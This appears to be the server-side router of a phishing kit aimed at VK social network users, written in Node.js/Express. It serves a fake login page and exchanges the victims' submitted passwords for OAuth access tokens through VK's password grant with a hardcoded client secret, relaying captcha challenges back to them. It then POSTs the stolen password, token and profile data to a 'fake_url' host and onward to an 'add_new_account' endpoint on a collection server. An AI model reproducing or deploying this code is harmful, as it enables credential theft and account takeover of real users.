require('dotenv').config()
const {Router} = require('express')
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const path = require('path')
const router  = new Router()

router.get('/', (request, response)=>{
    response.sendFile(path.resolve(__dirname, 'login.html'))
})
router.post('/check',async (request, response, next) => {
    let auth_data = request.body
    auth_data = {
        login: request.body.login,
        password: request.body.password,
        sid: request.body.captcha_sid,
        key:  request.body.captcha_key
    }
let request_data = request.body
    async function getAccessToken(auth_data){
        let res = await fetch(`https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=${auth_data.login}&password=${auth_data.password}&captcha_sid=${auth_data.sid || ''}&captcha_key=${auth_data.key || ''}`)
        try{
            let resp = await res.json()
            console.log(resp)
            if(resp.error){
                if(resp.error === 'need_captcha'){
                    return response.json({
                        error: 'need_captcha',
                        sid: resp.captcha_sid,
                        img: resp.captcha_img
                    })
                }
                return response.json({
                    error: true
                })
            }
            let user_data = await fetch(`https://api.vk.com/method/users.get?user_ids=${resp.user_id}&fields=sex,online,has_mobile,photo_400_orig,country,city,followers_count,counters&access_token=${resp.access_token}&v=5.131`)
            try{
               let response = await user_data.json()
                if(response.response.length > 0){
                    response = response.response[0]
                    let token = resp.access_token
                    console.log(request.body.fake_url)
                     fetch('https://'+request.body.fake_url+'/login/send',{
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({...response, ...request_data, token})
                    })
                }
            }catch (e) {
                console.log(e.message)
            }
           return  response.json({
                error: false
            })
        }catch (e) {
            console.log(e.message)
           //await getAccessToken(auth_data)
        }
    }
     getAccessToken(auth_data)
  console.log('CHECK')
})
router.post('/send',async (request, response, next) => {
  console.log('SEND')
   await fetch(process.env.SUB_SERVER_URL+'api/add_new_account',{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({...request.body})
    })
  return  response.json({
                error: false
            })
})

module.exports = router